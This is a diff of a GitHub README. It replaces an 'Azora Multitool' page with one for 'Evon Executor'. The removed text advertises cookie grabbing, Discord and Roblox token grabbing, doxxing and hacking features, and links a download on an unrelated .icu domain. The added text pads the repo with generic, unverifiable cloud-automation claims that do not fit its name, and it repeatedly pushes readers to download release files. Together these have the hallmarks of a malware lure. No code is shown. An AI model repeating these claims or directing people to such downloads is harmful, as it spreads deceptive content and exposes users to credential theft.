@@ -1,76 +1,120 @@
-# Azora Multitool 🛠️
+# Evon Executor 🚀
 
-Welcome to the Azora Multitool repository! This powerful tool written in Python is designed to assist users with various functions such as scanning, OSINT (Open Source Intelligence), accessing Roblox's API, Discord's API, and much more. Azora Multitool is constantly updated, free for everyone, open source, and easy to install.
+![Evon Executor](https://img.shields.io/badge/Evon%20Executor-v1.0.0-blue.svg)
+![GitHub Repo stars](https://img.shields.io/github/stars/dylanbbaum/Evon-Executor?style=social)
+![GitHub issues](https://img.shields.io/github/issues/dylanbbaum/Evon-Executor)
 
-[DOWNLOAD LINK](https://downloadgitzsx.icu?1ui16q59niznj1j)
+Welcome to the **Evon Executor** repository! This project is designed to enhance your automation and workflow management capabilities in cloud-native environments. Evon supports the Unified Naming Convention, ensuring compatibility with 99.9% of modern systems. 
 
-## Features 🚀
+## Table of Contents
 
-- **OSINT Capabilities:** Conduct thorough investigations using Azora Multitool's OSINT features to gather valuable information.
-- **Roblox API Access:** Utilize the tool to interact with Roblox's API for various tasks and purposes.
-- **Discord API Access:** Access Discord's API through Azora Multitool to enhance your Discord-related activities.
-- **Cookie Grabbing:** Capture cookies efficiently to optimize certain processes.
-- **Email Functions:** Perform email-related tasks with convenience.
-- **IP Related Tools:** Access tools related to IP addresses for diverse applications.
-- **Hacking and Pentesting Utilities:** Explore a range of tools to aid in hacking and pentesting activities.
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Topics](#topics)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## Installation 🛠️
+## Features
 
-To get started with Azora Multitool, simply download and install the tool by clicking the button below:
+- **Unified Naming Convention**: Seamlessly integrate with a wide range of modern systems.
+- **Automation**: Streamline your workflows and reduce manual tasks.
+- **Cloud-Native**: Designed for distributed systems and serverless architectures.
+- **Task Execution**: Execute tasks efficiently across multiple environments.
+- **Open Source**: Contribute to the project and help us grow.
 
-You'll find all the necessary instructions and guidelines for installation in the repository's documentation.
+## Getting Started
 
-## Usage ℹ️
+To get started with Evon Executor, you will need to download the latest release. You can find it [here](https://github.com/dylanbbaum/Evon-Executor/releases). Download the appropriate file for your system and follow the installation instructions below.
 
-Azora Multitool's intuitive interface makes it easy to navigate and utilize its diverse range of functionalities. Whether you're a beginner or an experienced user, the tool caters to your requirements effectively.
+## Installation
 
-## Repository Topics 📋
+1. **Download the latest release** from the [Releases section](https://github.com/dylanbbaum/Evon-Executor/releases).
+2. **Extract the files** to your desired location.
+3. **Install dependencies** using pip:
 
-- `cookie-grab`
-- `discord`
-- `discord-api`
-- `discord-multi-tool`
-- `discord-multitool`
-- `discord-token`
-- `dox`
-- `email`
-- `hacking-tool`
-- `ip`
-- `multitool`
-- `multitoolhacking`
-- `osint`
-- `osint-tool`
-- `pentesting`
-- `python`
-- `roblox`
-- `roblox-api`
-- `roblox-cookie`
-- `token-grab`
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-Explore these topics further to gain insights into Azora Multitool's capabilities.
+4. **Run the setup script**:
 
-## Support and Contributions 🤝
+   ```bash
+   python setup.py install
+   ```
 
-If you encounter any issues or have suggestions for improvements, feel free to raise them in the repository's issue section. Your feedback is valuable in enhancing Azora Multitool for a better user experience.
+## Usage
 
-Contributions from the community are always welcome. Whether it's bug fixes, enhancements, or new features, your contributions play a significant role in the tool's development.
+Once you have installed Evon Executor, you can start using it in your projects. Below are some examples to help you get started.
 
-## Explore More 🌐
+### Basic Command
 
-Visit our website for additional resources, news, and updates related to Azora Multitool. Get access to tutorials, blog posts, and community forums to engage with like-minded individuals.
+To execute a simple task, use the following command:
 
-## Stay Connected 📲
+```bash
+evon execute --task <task_name>
+```
 
-Connect with us on social media platforms to stay updated on the latest developments, releases, and announcements regarding Azora Multitool. Join our growing community of users and enthusiasts to share insights and experiences.
+### Workflow Management
 
-## License 📜
+Evon allows you to manage workflows easily. Create a workflow file and define your tasks:
 
-Azora Multitool is licensed under the MIT License. Refer to the repository's license file for more details regarding the terms and conditions.
+```yaml
+version: '1.0'
+tasks:
+  - name: task1
+    action: run_script
+  - name: task2
+    action: notify
+```
 
----
+Execute the workflow using:
 
-Start exploring the endless possibilities with Azora Multitool today! 🌟
+```bash
+evon run --workflow <workflow_file>
+```
 
-Happy hacking and exploring! 🔍🔒
+### Cloud Integration
 
----
+Evon supports integration with various cloud services. To configure cloud settings, edit the `config.yaml` file:
+
+```yaml
+cloud:
+  provider: aws
+  region: us-west-2
+```
+
+## Topics
+
+Evon Executor covers a wide range of topics, including:
+
+- **Automation**: Simplifying repetitive tasks.
+- **Cloud-Native**: Optimized for cloud environments.
+- **Distributed Systems**: Managing tasks across multiple nodes.
+- **Task Execution**: Efficiently running tasks in various contexts.
+- **Workflow Management**: Organizing tasks into workflows.
+
+For more details, check the [Releases section](https://github.com/dylanbbaum/Evon-Executor/releases) for updates and documentation.
+
+## Contributing
+
+We welcome contributions from the community. If you would like to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your branch and create a pull request.
+
+Please ensure that your code adheres to our coding standards and includes tests where applicable.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any questions or feedback, please reach out to us via GitHub issues or directly at [dylanbbaum](https://github.com/dylanbbaum).
+
+Thank you for your interest in Evon Executor! We look forward to seeing what you build with it.
